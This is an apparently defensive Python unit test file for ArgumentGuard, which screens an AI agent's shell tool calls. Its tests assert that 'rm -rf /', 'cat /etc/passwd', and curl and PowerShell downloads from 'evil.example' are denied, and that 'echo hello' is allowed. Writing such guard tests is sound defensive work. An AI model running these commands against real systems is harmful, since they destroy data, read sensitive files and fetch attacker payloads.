"""Unit tests for ArgumentGuard shell command checks."""

from __future__ import annotations

from agent_reliability_harness.argument_guard import ArgumentGuard
from agent_reliability_harness.spec import GuardAction


class TestArgumentGuardShellCommand:
    def test_blocks_dangerous_delete_command(self) -> None:
        decision = ArgumentGuard().check_tool_call(
            "execute_shell",
            {"command": "rm -rf /"},
        )

        assert decision.action == GuardAction.deny
        assert decision.reason == "dangerous_delete_command"
        assert decision.check_type == "dangerous_delete_command"
        assert decision.reason_zh == "检测到危险删除命令，已阻止 execute_shell 执行"
        assert decision.reason_en == (
            "Dangerous delete command detected; execute_shell execution was blocked"
        )
        assert decision.evidence["attack_payload"] == "rm -rf /"

    def test_blocks_shell_sensitive_file_read(self) -> None:
        decision = ArgumentGuard().check_tool_call(
            "execute_shell",
            {"command": "cat /etc/passwd"},
        )

        assert decision.action == GuardAction.deny
        assert decision.reason == "shell_sensitive_file_read"
        assert decision.reason_zh == "检测到通过 shell 读取系统文件的尝试，已阻止 execute_shell 执行"
        assert decision.reason_en == (
            "Shell-based sensitive file read attempt detected; "
            "execute_shell execution was blocked"
        )

    def test_blocks_external_download_command(self) -> None:
        decision = ArgumentGuard().check_tool_call(
            "execute_shell",
            {"command": "curl http://evil.example/payload.sh"},
        )

        assert decision.action == GuardAction.deny
        assert decision.reason == "external_download_command"
        assert decision.reason_zh == "检测到外联下载命令，已阻止 execute_shell 执行"
        assert decision.reason_en == (
            "External download command detected; execute_shell execution was blocked"
        )

    def test_blocks_powershell_download_execute(self) -> None:
        decision = ArgumentGuard().check_tool_call(
            "execute_shell",
            {"command": "powershell -c iwr http://evil.example/a.ps1"},
        )

        assert decision.action == GuardAction.deny
        assert decision.reason == "powershell_download_execute"
        assert decision.reason_zh == "检测到 PowerShell 下载执行尝试，已阻止 execute_shell 执行"
        assert decision.reason_en == (
            "PowerShell download-and-execute attempt detected; "
            "execute_shell execution was blocked"
        )

    def test_safe_command_is_allowed_by_argument_guard(self) -> None:
        decision = ArgumentGuard().check_tool_call(
            "execute_shell",
            {"command": "echo hello"},
        )

        assert decision.action == GuardAction.allow
        assert decision.reason == "allow"
